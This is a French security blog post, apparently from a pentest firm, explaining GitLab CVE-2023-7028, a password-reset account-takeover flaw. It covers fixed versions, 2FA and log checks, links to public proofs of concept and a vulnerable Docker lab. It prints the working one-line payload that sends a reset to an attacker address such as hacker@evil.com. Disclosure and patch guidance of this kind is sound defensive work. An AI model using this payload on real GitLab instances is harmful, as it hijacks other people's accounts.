---
title: "Compromettre des comptes Gitlab avec la vuln√©rabilit√© CVE-2023-7028"
description: "FIXME description √† remplir"
date: 2024-01-19T17:32:30+01:00
draft: false
images: [/images/compromettre-comptes-Gitlab-avec-CVE-2023-7028/logo.png]
featuredImage: "/images/compromettre-comptes-Gitlab-avec-CVE-2023-7028/logo.png"
featuredImagePreview: "/images/compromettre-comptes-Gitlab-avec-CVE-2023-7028/logo.png"
tags: ["Test d'intrusion", "Pentest", "Audit"]
---

# üòÆ Exposer GitLab publiquement en 2024 : trop dangereux ?

<br>
<br>

Est ce que exposer son propre Gitlab est une bonne pratique de s√©curit√© ? Et bien vous allez voir que **non**.

2024 commence fort et donne encore de bonnes raisons de **ne pas exposer ce service sur Internet** (mais plut√¥t de l'h√©berger derri√®re un VPN).

## Un d√©but d'ann√©e sous haute tension

Le 11 janvier 2024, GitLab, la c√©l√®bre plateforme communautaire, a publi√© une annonce importante concernant les nouvelles versions `16.7.2, 16.6.4 et 16.5.6` pour GitLab Community Edition (CE) et Enterprise Edition (EE).

Deux vuln√©rabilit√©s sont expliqu√©es :

1. La vuln√©rabilit√© **CVE-2023-7028** 
    - CVSS de 10/10 üòÆ
    - Elle permet la prise de contr√¥le d'un compte via la r√©initialisation du mot de passe sans interaction de l'utilisateur.

2. La vuln√©rabilit√© **CVE-2023-5356** 
    - CVSS de 9.6/10 üòü
    - Elle permet √† un utilisateur d'abuser des int√©grations Slack/Mattermost pour ex√©cuter des commandes slash en tant qu'autre utilisateur.

## En bref

La vuln√©rabilit√© la plus probl√©matique est la premi√®re : la **CVE-2023-7028**.

Loin d'√™tre inoffensive, elle est tr√®s probl√©matique :

- Elle permet de r√©initialiser le mot de passe de n'importe quel utilisateur.
- La vuln√©rabilit√© est exploitable sans compte.
- Il est n√©cessaire de connaitre le mail de la victime.
- La charge tient en une ligne : `user[email][]=my.target@example.com&user[email][]=hacker@evil.com`

La deuxi√®me vuln√©rabilit√© est tout aussi grave mais moins facilement exploitable.

## Exploitation

Pour exploiter cette vuln√©rabilit√©, le PoC est vraiment tr√®s simple :

```
user[email][]=valid@email.com&user[email][]=attacker@email.com
```

- `valid@email.com` est l'adresse de la victime
- `attacker@email.com` est l'adresse de l'attaquant

Une confusion est effectu√©e par GitLab rendant la possibilit√© √† un attaquant d'√©craser le mail de la victime par le sien üòÆ !

Plus pr√©cis√©ment, une modification a √©t√© apport√©e √† la version `16.1.0` afin de permettre aux utilisateurs de r√©initialiser leur mot de passe √† l'aide d'une adresse √©lectronique secondaire. La vuln√©rabilit√© r√©sulte d'un bug dans le processus de v√©rification des email.

üëâ Plus de d√©tails sur le blog de GitLab : https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/#account-takeover-via-password-reset-without-user-interactions


## Actions recommand√©es

Gitlab recommande les actions suivantes : 

1Ô∏è‚É£  **Mise √† jour imm√©diate** : il est fortement conseill√© de mettre √† jour Gitlab vers la derni√®re version corrig√©e. Pour les utilisateurs n'ayant pas encore effectu√© de mise √† jour, GitLab recommande de passer directement aux versions `16.7.3, 16.6.5, 16.5.7` ou ult√©rieures.

2Ô∏è‚É£ **Activer l'authentification √† deux facteurs (2FA)**: GitLab conseille d'activer le 2FA pour tous les comptes. Cette s√©curit√© emp√™che l'utilisation de cette vuln√©rabilit√©.

3Ô∏è‚É£ **V√©rification de l'int√©grit√©** : il est conseill√© aux clients auto-g√©r√©s d'examiner leurs logs afin d√©tecter toute tentative d'exploitation de ces vuln√©rabilit√©s.

Exemple :

- Consulter le fichier `gitlab-rails/production_json.log` afin de v√©rifier qu'aucune requ√™te pointant vers la route `/users/password` ne contienne **plusieurs adresses emails**.
- Consulter le fichier `gitlab-rails/audit_json.log` afin de v√©rifier que le champ `meta.caller_id` de `PasswordsController#create` et `target_details` ne contiennent pas **plusieurs adresses emails**.

## Automatisation

De nombreux PoC sont disponibles sur Internet permettant d'automatiser la vuln√©rabilit√© :

- Fait par un fran√ßais talentueux : https://github.com/Vozec/CVE-2023-7028
- https://github.com/V1lu0/CVE-2023-7028

## Docker vuln√©rable

Pour les plus curieux, vous trouverez ci-dessous un docker compose vuln√©rable pour pratiquer cette vuln√©rabilit√©

```yaml
version: '3.6'
services:
  gitlab:
    image: 'gitlab/gitlab-ce:16.1.4-ce.0'
    restart: always
    hostname: 'gitlab.domain.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://gitlab.domain.com'
        gitlab_rails['smtp_enable'] = true
        gitlab_rails['smtp_address'] = "smtp_address"
        gitlab_rails['smtp_port'] = 587
        gitlab_rails['smtp_user_name'] = "smtp_user_name"
        gitlab_rails['smtp_password'] = "smtp_password"
        gitlab_rails['smtp_domain'] = "domain.com"
        gitlab_rails['smtp_authentication'] = "login"
        gitlab_rails['smtp_enable_starttls_auto'] = true
    ports:
      - '80:80'
      - '443:443'
      - '22:22'
    volumes:
      - './gitlab/config:/etc/gitlab'
      - './gitlab/logs:/var/log/gitlab'
      - './gitlab/data:/var/opt/gitlab'
```

## D√©monstration

Petite d√©monstration ci-dessous pour pr√©senter l'exploitation de la vuln√©rabilit√© :

<video src="/images/compromettre-comptes-Gitlab-avec-CVE-2023-7028/exploit.mp4" controls title="Exploitation de Gitlab avec la vuln√©rabilit√© CVE-2023-7028" style="width:100%"></video>

üôè Patchez rapidement. Trackflaw est la pour vous aider dans cette t√¢che. Prenez contact avec nous sur https://trackflaw.com ou par email contact (@) trackflaw.com

## Sources

- https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/#account-takeover-via-password-reset-without-user-interactions
